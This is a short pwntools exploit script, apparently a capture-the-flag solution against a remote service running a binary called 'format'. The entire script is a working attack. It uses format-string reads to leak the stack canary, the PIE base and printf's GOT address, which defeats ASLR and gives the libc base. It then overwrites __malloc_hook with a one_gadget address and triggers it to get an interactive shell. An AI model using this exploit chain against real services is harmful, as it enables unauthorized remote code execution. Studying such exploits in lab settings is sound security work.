#!/usr/bin/python3

from pwn import *

# p = process('./format')

context.arch = 'amd64'

elf = ELF('format')
libc = ELF('libc6_2.27-3ubuntu1_amd64.so')
p = remote('188.166.146.97', 31949)

stack_cookie = b'%39$p' # stack canary
binary_base_address = b'%41$p' # bypass pie

p.sendline(stack_cookie)
leak = p.recvline().strip().decode('utf-8')
log.success(f"stack cookie = {leak}")

p.sendline(binary_base_address)
format_base_addr = p.recvline().strip().decode('utf-8')
format_base_addr = hex(int(format_base_addr, 16) - 0x12b3)
log.success(f"format base address = {format_base_addr}")
elf.address = int(format_base_addr, 16)

printf_got_plt = elf.got['printf'] # bypass aslr
log.success(f'printf @got.plt = {hex(printf_got_plt)}')

payload = b'AAAA%7$s' + p64(printf_got_plt)
p.sendline(payload)
libc_leak = p.recv()
printf_leak = u64(libc_leak[4:10].ljust(8, b"\x00"))
log.success(f"printf libc = {hex(printf_leak)}")

base_address = printf_leak - 0x64e80
log.success(f'libc base address = {hex(base_address)}')

onegadget = base_address + 0x4f322 # onegadget
log.success(f'one_gadget payload: {hex(onegadget)}')

offset = libc.symbols['__malloc_hook'] # __malloc_hook
malloc_hook = base_address + offset
log.success(f'malloc_hook = {hex(malloc_hook)}')

p.sendline(fmtstr_payload(6, { malloc_hook : onegadget }))
p.recv()
p.sendline(b'%100000')

p.interactive()
